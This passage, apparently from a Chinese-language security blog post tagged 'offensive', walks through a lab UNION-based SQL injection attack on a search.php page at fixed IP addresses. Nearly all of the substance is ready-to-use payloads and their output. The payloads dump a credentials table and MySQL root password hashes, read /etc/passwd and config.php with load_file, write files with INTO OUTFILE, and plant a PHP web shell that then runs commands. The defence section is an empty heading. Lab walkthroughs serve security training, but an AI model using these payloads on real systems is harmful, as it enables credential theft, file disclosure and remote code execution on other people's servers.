+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>, column_name,table_name,table_schema \</span><br><span class="line"><span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'credentials'</span> <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br><span class="line">| port city |  port city  | port volume |</span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br><span class="line">| username  | credentials | dev         |</span><br><span class="line">| <span class="keyword">password</span>  | credentials | dev         |</span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得dev这个数据/SCHEMA中<code>credentials</code>表格<code>username</code>和<code>password</code>相关的数据</p>
+<ul>
+<li>输入<code>&#39; union select null, username, password, null from dev.credentials -- -</code></li>
+<li><code>dev.credentials</code> 访问的相关表格</li>
+<li><code>username</code>和<code>password</code>访问的相关信息</li>
+<li><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select null, username, password, null from dev.credentials – - </li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>, username, <span class="keyword">password</span>, <span class="literal">null</span> <span class="keyword">from</span> dev.credentials <span class="comment">-- - </span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br><span class="line">| port city |  port city  | port volume |</span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br><span class="line">| user1     |*my_password |             |</span><br><span class="line">+<span class="comment">-----------+-------------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<ul>
+<li><p>SQLi读取文件</p>
+<ol>
+<li><p>查看文件是否有<code>super_priv</code>权限，</p>
+<ul>
+<li>输入<code>&#39;union select null,super_priv,null,null from mysql.user -- -</code></li>
+<li>此前查看我们当前登录的用户是<code>root@localhost</code></li>
+<li>可以通过该用户名查当前是否拥有该权限，将其显示在表格中</li>
+<li>此处的<code>Y</code>证明该权限的存在</li>
+<li><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20super_priv,%20null,%20null%20from%20mysql.user%20where%20user%20=%20%27root%27%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20super_priv,%20null,%20null%20from%20mysql.user%20where%20user%20=%20%27root%27%20--%20-</a></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,super_priv,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> mysql.user \</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">user</span> = <span class="string">'root'</span> <span class="comment">-- -`</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">------------+------------+-------------+</span></span><br><span class="line">| Port Code  | Port City  | Port Volume |</span><br><span class="line">+<span class="comment">------------+------------+-------------+</span></span><br><span class="line">| Y          |            |             |</span><br><span class="line">+<span class="comment">------------+------------+-------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得数据root@localhost的密码哈稀值</p>
+<ul>
+<li><p>通过查看数据库<code>mysql.user</code>获得</p>
+</li>
+<li><p>输入<code>&#39;union select null, user, password, null from mysql.user -- -</code></p>
+</li>
+<li><p><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20user,%20password,%20null%20from%20mysql.user%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20user,%20password,%20null%20from%20mysql.user%20--%20-</a></p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>, <span class="keyword">user</span>, <span class="keyword">password</span>, <span class="literal">null</span> <span class="keyword">from</span> mysql.user <span class="comment">-- -'</span></span><br><span class="line">+<span class="comment">------------+-------------------------------------------+-------------+</span></span><br><span class="line">| Port Code  |                Port City                  | Port Volume |</span><br><span class="line">+<span class="comment">------------+-------------------------------------------+-------------+</span></span><br><span class="line">| root       | *<span class="number">00</span>CD4F3F18928665AE2E1485012AC46B5E25B933 |             |</span><br><span class="line">+<span class="comment">------------+-------------------------------------------+-------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看用户文件权限属性</p>
+<ul>
+<li>输入<code>&#39; union select null, grantee, privilege_type, is_grantable from information_schema.user_privileges -- -</code></li>
+<li>通过<code>information_shcema.user_privileges</code>读取字段<code>grantee</code>, <code>privilege_type, is_grantable</code></li>
+<li>主要关注<code>FILE</code>权限是<code>YES</code>表明对文件有阅读权限</li>
+<li><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20grantee,%20privilege_type,%20is_grantable%20from%20information_schema.user_privileges%20%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20grantee,%20privilege_type,%20is_grantable%20from%20information_schema.user_privileges%20%20--%20-</a></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>, grantee, privilege_type, is_grantable \</span><br><span class="line"><span class="keyword">from</span> information_schema.user_privileges <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">--------------------+------------+-------------+</span></span><br><span class="line">|     Port Code      | Port City  | Port Volume |</span><br><span class="line">+<span class="comment">--------------------+------------+-------------+</span></span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">SELECT</span>     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">INSERT</span>     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">UPDATE</span>     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">DELETE</span>     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">CREATE</span>     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">DROP</span>       | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | RELOAD     | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">SHUTDOWN</span>   | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | PROCESS    | YES         |</span><br><span class="line">| <span class="string">'root'</span>@<span class="string">'localhost'</span> | <span class="keyword">FILE</span>       | YES         |</span><br><span class="line">|      SNIP          | SNIP       | SNIP        |</span><br><span class="line">+<span class="comment">--------------------+------------+-------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>读取文件<code>/etc/passwd</code></p>
+</li>
+</ol>
+<ul>
+<li>输入<code>&#39; union select null, load_file(&#39;/etc/passwd&#39;), null, null -- -</code></li>
+<li>通过函数<code>select load_file(&#39;/path/to/file&#39;)</code></li>
+<li><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/etc/passwd%27),%20null,%20null%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/etc/passwd%27),%20null,%20null%20--%20-</a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>, <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>), <span class="literal">null</span>, <span class="literal">null</span> <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">---------------------------------------------------------+------+------+----------------+</span></span><br><span class="line">|                          Col1                           | Col2 | Col3 | <span class="built_in">Numeric</span> <span class="keyword">Column</span> |</span><br><span class="line">+<span class="comment">---------------------------------------------------------+------+------+----------------+</span></span><br><span class="line">| root:x:<span class="number">0</span>:<span class="number">0</span>:root:&lt;SNIP&gt;aemon:/usr/sbin:/usr/sbin/nologin |      |      |                |</span><br><span class="line">+<span class="comment">---------------------------------------------------------+------+------+----------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="5">
+<li>在页面内读取<code>search.php</code>源代码，获得配置文件</li>
+</ol>
+<ul>
+<li><p>目前已经可以在提供的表格中展示查看到的内容</p>
+</li>
+<li><p>我们可以尝试将<code>search.php</code>的源代码文件放在上面显示（/var/www/html 默认apache2的目录）</p>
+</li>
+<li><p>输入<code>&#39; union select null, load_file(&#39;/var/www/html/search.php&#39;), null, null -- -</code></p>
+</li>
+<li><p><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/search.php%27),%20null,%20null%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/search.php%27),%20null,%20null%20--%20-</a></p>
+</li>
+<li><p>利用<code>Ctrl+U</code>，可以打开浏览器源代码页面<br><img src="souce.png" alt="source"></p>
+</li>
+<li><p>此时，我们发现源代码中引入了<code>config.php</code>，这个我们此前不知道的文件，我们照例将其输出到页面的表格中查看内容</p>
+</li>
+<li><p>输入<code>&#39; union select null, load_file(&#39;/var/www/html/config.php&#39;), null, null -- -</code></p>
+</li>
+<li><p><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/config.php%27),%20null,%20null%20--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/config.php%27),%20null,%20null%20--%20-</a><br><img src="config.png" alt="config"></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>SQLi写入文件<br>secure_file_priv<br>The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn’t possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.</li>
+</ul>
+<p><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20%201,%20variable_name,%20variable_value,%204%20FROM%20information_schema.global_variables%20where%20variable_name=%22secure_file_priv%22--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%20%201,%20variable_name,%20variable_value,%204%20FROM%20information_schema.global_variables%20where%20variable_name=%22secure_file_priv%22--%20-</a></p>
+<p>+——————+————+————-+<br>|    Port Code     | Port City  | Port Volume |<br>+——————+————+————-+<br>| SECURE_FILE_PRIV |            |           4 |<br>+——————+————+————-+<br>And the result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location.</p>
+<h2 id="SELECT-INTO-OUTFILE"><a href="#SELECT-INTO-OUTFILE" class="headerlink" title="SELECT INTO OUTFILE"></a>SELECT INTO OUTFILE</h2><p>Now that we have confirmed that our user should write files to the back-end server, let’s try to do that using the SELECT .. INTO OUTFILE statement. The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.</p>
+<p><a href="http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%201,%27file%20written%20successfully!%27,3,4%20into%20outfile%20%27/var/www/html/proof.txt%27--%20-" target="_blank" rel="noopener">http://167.99.202.131:32366/search.php?port_code=cn%27%20union%20select%201,%27file%20written%20successfully!%27,3,4%20into%20outfile%20%27/var/www/html/proof.txt%27--%20-</a></p>
+<p>// write text to /www/html/proof.txt<br><a href="http://178.62.74.50:30055/search.php?port_code=cn%27%20union%20select%201,%27file%20written%20successfully!%27,3,4%20into%20outfile%20%27/var/www/html/proof.txt%27--%20-" target="_blank" rel="noopener">http://178.62.74.50:30055/search.php?port_code=cn%27%20union%20select%201,%27file%20written%20successfully!%27,3,4%20into%20outfile%20%27/var/www/html/proof.txt%27--%20-</a></p>
+<p>//check<br><a href="http://178.62.74.50:30055/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/proof.txt%27),%20null,%20null%20--%20-" target="_blank" rel="noopener">http://178.62.74.50:30055/search.php?port_code=cn%27%20union%20select%20null,%20load_file(%27/var/www/html/proof.txt%27),%20null,%20null%20--%20-</a></p>
+<p>+———————————-+————+————-+<br>|            Port Code             | Port City  | Port Volume |<br>+———————————-+————+————-+<br>| 1 file written successfully! 3 4 |            |             |<br>+———————————-+————+————-+</p>
+<h2 id="Writing-a-Web-Shell"><a href="#Writing-a-Web-Shell" class="headerlink" title="Writing a Web Shell"></a>Writing a Web Shell</h2><p><a href="http://178.62.74.50:30055/search.php?port_code=?port_code=cn%27%20union%20select%20%22%20%22,%27%3C?php%20system($_REQUEST[0]);%20?%3E%27,%20%22%20%22,%20%22%20%22%20into%20outfile%20%27/var/www/html/shell.php%27--%20-" target="_blank" rel="noopener">http://178.62.74.50:30055/search.php?port_code=?port_code=cn%27%20union%20select%20%22%20%22,%27%3C?php%20system($_REQUEST[0]);%20?%3E%27,%20%22%20%22,%20%22%20%22%20into%20outfile%20%27/var/www/html/shell.php%27--%20-</a></p>
+<p><a href="http://SERVER_IP:PORT/search.php?port_code=cn&#39;" target="_blank" rel="noopener">http://SERVER_IP:PORT/search.php?port_code=cn&#39;</a> union select “ “,’<?php system($_REQUEST[0]); ?>‘, “ “, “ “ into outfile ‘/var/www/html/shell.php’– -</p>
+<p><a href="http://178.62.74.50:30055/shell.php?0=id" target="_blank" rel="noopener">http://178.62.74.50:30055/shell.php?0=id</a><br><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<h2 id="webshell构建后门"><a href="#webshell构建后门" class="headerlink" title="webshell构建后门"></a>webshell构建后门</h2><h2 id="如何防止SQL注入"><a href="#如何防止SQL注入" class="headerlink" title="如何防止SQL注入"></a>如何防止SQL注入</h2><h1 id="补充延伸"><a href="#补充延伸" class="headerlink" title="补充延伸"></a>补充延伸</h1><ul>
+<li><a href="https://www.acunetix.com/websitesecurity/sql-injection2/" target="_blank" rel="noopener">Types of SQL Injection</a>    # SQL注入类型</li>
+<li><a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html" target="_blank" rel="noopener">INFORMATION_SCHEMA Tables</a>   # INFORMATION_SCHEMA 信息</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1>
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/offensive/" rel="tag"># offensive</a>
+          
+            <a href="/tags/sqli/" rel="tag"># sqli</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/04/nmap-2/" rel="next" title="nmap实践和引擎基础">
+                <i class="fa fa-chevron-left"></i> nmap实践和引擎基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Alopex Cheung">
+  
+  <p class="site-author-name" itemprop="name">Alopex Cheung</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="https://github.com/Alopex4" title="GitHub &rarr; https://github.com/Alopex4" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="mailto:tiandiv4@gmail.com" title="E-Mail &rarr; mailto:tiandiv4@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+    
+  </div>
+
+
+
+
+
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#预备知识"><span class="nav-number">2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文内容"><span class="nav-number">3.</span> <span class="nav-text">正文内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入基本介绍"><span class="nav-number">3.1.</span> <span class="nav-text">SQL注入基本介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入的基本流程"><span class="nav-number">3.2.</span> <span class="nav-text">SQL注入的基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SELECT-INTO-OUTFILE"><span class="nav-number">3.3.</span> <span class="nav-text">SELECT INTO OUTFILE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Writing-a-Web-Shell"><span class="nav-number">3.4.</span> <span class="nav-text">Writing a Web Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell构建后门"><span class="nav-number">3.5.</span> <span class="nav-text">webshell构建后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何防止SQL注入"><span class="nav-number">3.6.</span> <span class="nav-text">如何防止SQL注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充延伸"><span class="nav-number">4.</span> <span class="nav-text">补充延伸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Alopex Cheung</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">203k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">5:38</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a>  v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+
+ <script async src="//dn-lbstatics.gbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script> 
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+<script>
+// GET RESPONSIVE HEIGHT PASSED FROM IFRAME
+
+window.addEventListener("message", function(e) {
+  var data = e.data;
+  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
+    var featureID = data.split(':')[1];
+    var height = data.split(':')[2];
+    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
+  }
+}, false);
+</script>
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
